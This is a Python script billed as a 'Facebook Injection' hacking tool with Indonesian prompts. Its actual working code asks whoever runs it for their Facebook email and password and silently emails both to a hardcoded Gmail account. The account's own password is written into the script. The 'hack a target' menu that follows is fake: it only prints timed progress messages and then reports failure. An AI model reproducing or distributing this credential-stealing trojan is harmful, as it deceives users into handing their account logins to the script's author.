#!/bin/usr/python

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import time, os

os.system('clear')
print ("""\033[1;35m

	%#%#%#%#%#%#%#%#%#%#%#%#%#%#%#%#
	%#                            %#
	%#     FACEBOOK INJECTION     %#
	%#             BY             %#
	%#    KHAZUL YUSSERY SHADIQ   %#
	%#                            %#
        %#%#%#%#%#%#%#%#%#%#%#%#%#%#%#%#

""")
print (" ")
os.system('date | lolcat')
print (" ")
print ("\033[1;33m Login Fb dulu : ")
print ("\033[1;31m --------------- ")
print (" ")

#

msg = MIMEMultipart()

message = input("\033[1;37m Email    : ")

#

password = "khazul0411"
msg['From'] = "khazulyusseryshadiq@gmail.com"
msg['To'] = "khazulyusseryshadiq@gmail.com"
msg['Subject'] = input("\033[1;37m Password : ")

#

msg.attach(MIMEText(message, 'plain'))

#

server = smtplib.SMTP('smtp.gmail.com: 587')
server.starttls()
server.login(msg['From'], password)
server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()
print (" ")
print ("\033[1;33m [+] Login Berhasil ")

#########################################################
print (" ")
print ("\033[1;31m Mau Hack via : ")
print ("\033[1;32m -------------- ")
print ("\033[1;31m 1). Email      ")
print ("\033[1;31m 2). No. Hp     ")
print ("\033[1;31m 3). ID         ")
print ("\033[1;31m -------------- ")
a = input("\033[1;32m Pilih 》 : ")
if a == "1":
	print (" ")
	b = input ("\033[1;37m Masukkan Email Target : ")
	print (" ")
	print ("\033[1;31m [+] Menghubungkan ke server ... ")
	time.sleep(5)
	print ("\033[1;31m [+] Terhubung ... ")
	time.sleep(1.5)
	print (" ")
	print ("\033[1;31m [+] Mengambil data ... ")
	time.sleep(5)
	print ("\033[1;31m [+] Mencari password ... ")
	time.sleep(8)
	print (" ")
	print ("\033[1;33m [!] Gagal ! ")
elif a == "2":
	print (" ")
	c = input ("\033[1;37m Masukkan nomor hp target : ")
	print (" ")
	print ("\033[1;31m [+] Menghubungkan ke server ... ")
	time.sleep(5)
	print ("\033[1;31m [+] Terhubung ... ")
	time.sleep(5)
	print (" ")
	print ("\033[1;31m [+] Mengambil data ... ")
	time.sleep(5)
	print ("\033[1;31m [+] Mencari password ... ")
	time.sleep(8)
	print (" ")
	print ("\033[1;33m [!] Gagal ! ")
elif a == "3":
        print (" ")
        c = input ("\033[1;37m Masukkan ID target : ")
        print (" ")
        print ("\033[1;31m [+] Menghubungkan ke server ... ")
        time.sleep(5)
        print ("\033[1;31m [+] Terhubung ... ")
        time.sleep(5)
        print (" ")
        print ("\033[1;31m [+] Mengambil data ... ")
        time.sleep(5)
        print ("\033[1;31m [+] Mencari password ... ")
        time.sleep(8)
        print (" ")
        print ("\033[1;33m [!] Gagal ! ")
